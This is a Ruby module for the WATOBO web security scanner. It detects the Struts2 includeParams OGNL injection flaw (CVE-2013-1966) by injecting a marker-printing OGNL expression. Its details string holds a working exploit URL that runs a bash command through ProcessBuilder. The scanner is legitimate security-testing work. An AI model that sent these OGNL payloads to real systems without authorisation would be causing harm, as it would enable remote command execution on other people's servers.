# @private 
module Watobo#:nodoc: all
  module Modules
    module Active
      module Struts2
        
        
        class Include_params_ognl < Watobo::ActiveCheck
          
          threat =<<'EOF'
A vulnerability, present in the includeParams attribute of the URL and Anchor Tag, allows remote command execution

Source: http://struts.apache.org/release/2.3.x/docs/s2-013.html
CVE: CVE-2013-1966
EOF

#
            details =<<'EOD'           
Example for code execution:
http://your.vulnerable.app/?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{%27/bin/bash%27,%27-c%27,%27touch%20/tmp/pwned%27})).start()}
EOD

            
            measure = "Update Struts2 to version >2.3.14"
            
            @info.update(
                         :check_name => 'Struts2 includeParams',    # name of check which briefly describes functionality, will be used for tree and progress views
            :check_group => "Struts",
            :description => "Check for vulnerable includeParams attribute.",   # description of checkfunction
            :author => "Andreas Schmidt", # author of check
            :version => "1.0"   # check version
            )
            
            @finding.update(
                            :threat => threat,        # thread of vulnerability, e.g. loss of information
                            :class => "Struts2 - includeParams",    # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
            :type => FINDING_TYPE_VULN,         # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
            :rating => VULN_RATING_CRITICAL,
            :measure => measure,
            :details => details
            )
          
          def initialize(project, prefs={})
            super(project, prefs)
            
          end
          
          
          def generateChecks(chat)    
            begin   

                checker = proc {
                  results = {}
                  request = nil
                  response = nil
                  test_request = chat.copyRequest
                     
                  
                  test_value = "%{(#_memberAccess['allowStaticMethodAccess']=true)(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(INJ),#writer.close())}"
                  marks = [ "INJ" , Time.now.to_i.to_s ]
                  
                  inj_str = marks.map{|m| "'#{m}'"}.join("+")
                  
                  test_value.gsub!(/INJ/, inj_str)
                  
                  tparam = Watobo::UrlParameter.new( :name => "watobo", :value => CGI::escape(test_value) )
                  
                  test_request.url.set tparam
                  #puts test_request.first
                  
                  request, response = doRequest(test_request)
                  
                  if response.respond_to? :body
                    unless response.body.nil?
                       body = response.body.unpack("C*").pack("C*")
                       #puts body
                       proof = marks.join
                       if response.body.to_s =~ /#{proof}/
                           addFinding( request, response,
                                 :check_pattern => CGI::escape(test_value),
                                 :proof_pattern => "#{proof}",
                                 :chat => chat,
                                 :title => "[includeParams] - #{request.file}"
                                 )
                       end
                    end
                  end
                   
                    [ request, response ]
                  }
                  yield checker
              
            rescue => bang
              puts bang
              puts bang.backtrace if $DEBUG
              puts "ERROR!! #{Module.nesting[0].name}"
              raise
            end
          end
          
        end
        
      end
    end
  end
end
